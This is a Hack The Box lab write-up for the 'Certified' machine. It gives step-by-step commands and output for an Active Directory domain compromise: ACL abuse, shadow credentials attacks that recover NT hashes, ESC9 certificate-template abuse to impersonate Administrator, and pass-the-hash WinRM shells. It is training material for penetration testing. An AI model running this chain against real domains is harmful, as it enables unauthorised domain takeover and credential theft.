---
title: "HTB: Certified"
# description: ""
date: "2025-03-16 11:33:00 +0800"
categories: [hackthebox,windows-AD]
tags: [writeOwner,genericAll,genericWrite,shadow-credential,certipy,adcs,esc9]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/certified.png
#   alt: "HTB: Certified"
---
**Starting with low-priv creds, I abuse WriteOwner on a group to pivot to another user, then leverage GenericAll to perform ESC9 on ADCS — modifying a user's UPN to obtain a certificate as administrator.**

**As is common in Windows pentests, you will start the Certified box with credentials for the following account:
Username: `judith.mader` Password: `judith09`**

---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Credentials</span>
I am a low priv user, judith.mader, with the password “judith09” at the start of the box. This is meant to reflect many real world pentests that start this way. I’ll verify they do work over SMB:

```console
$ nxc smb certified.htb -u judith.mader -p judith09
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
```
#### Check SMB shares
```console
$ nxc smb dc01.certified.htb -u judith.mader -p judith09 --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```

These are the standard shares for a Windows domain controller.

#### Check ADCS
Look for vulnerable certificate templates that judith.mader can abuse:
```console
$ certipy-ad find -vulnerable -u judith.mader -p judith09 -dc-ip 10.10.11.41 -stdout
..snip..
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```
There are none templates are exploitable from `judith.mader`.


### <span style="color:lightgreen">Bloodhound</span>
Use bloodhound to show us path
```console
$ bloodhound-python -u judith.mader -p judith09 -c all -d certified.htb -ns 10.10.11.41 --zip
```
#### Analysis
There have `WriteOwner` On the `Management group`. This group has `GenericWrite` over the `Management_SVC` user, who has `GenericAll` over the `CA_Operator` user. “PathFinding” shows the full path:
![Desktop View](assets/md_images/bloodhound-certified.png){: .w-75 .rounded-10 w='1212' h='668' }


## <span style="color:lightblue">Shell as Management_SVC</span>

### <span style="color:lightgreen">WriteOwner</span>

Modify Owner - The syntax for `impacket-owneredit` is slightly different from what Bloodhound shows:
```console
$ impacket-owneredit -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Modify Rights - give `judith.mader` the rights to add users:
```console
$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20241027-152313.bak
[*] DACL modified successfully!
```

Add to Group - add `judith.mader` to the `Management` group:
```console
$ net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Check Add to Group success?
```console
$ net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

### <span style="color:lightgreen">GenericWrite</span>
#### Shadow Credentials Attack 
```console
$ certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '91c77677-13a9-3225-4533-8a5ec50d7c90'
[*] Adding Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
We got NTLM hash for the `management_svc` account.

#### Winrm
Check hash works,and we can winrm in `DC01`:
```
$ nxc smb 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 

$ nxc winrm 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)

```
Get user flag
```
$ evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

*Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt
a97055d5************************
```
## <span style="color:lightblue">Auth as CA_Operator</span>
### <span style="color:lightgreen">GenericAll</span>
#### Shadow Credentials Attack 
```console
$ certipy-ad shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290'
[*] Adding Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
#### Check Credentials
```console
$ nxc smb 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

$ nxc winrm 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2

```

### <span style="color:lightgreen">Enumerate ADCS</span>
```console
$ certipy-ad find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

..snip..
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```
There’s a template named CertifiedAuthentication that is vulnerable to ESC9.

## <span style="color:lightblue">Shell as administrator</span>
### <span style="color:lightgreen">Abuse ESC9</span>
This [article](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) says,
To abuse this misconfiguration, the attacker needs `GenericWrite` over any account A that is allowed to enroll in the certificate template to compromise account B (target).

Abuse my access to the `management_svc` account that has `GenericAll` over the `ca_operator` account, using it to change the `userPrincipalName` of `ca_operator` to be `Administrator`:

```console
$ certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Letʼs request a certificate as `ca_operator` using the vulnerable template:
```console
$ certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Cleanup by changing `ca_operator’s` upn back
```console
$ certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

Use the certificate to get the administrator’s NTLM hash:
```console
$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

### <span style="color:lightgreen">administrator shell</span>
```console
$ evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34

*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
b4d21d77************************
```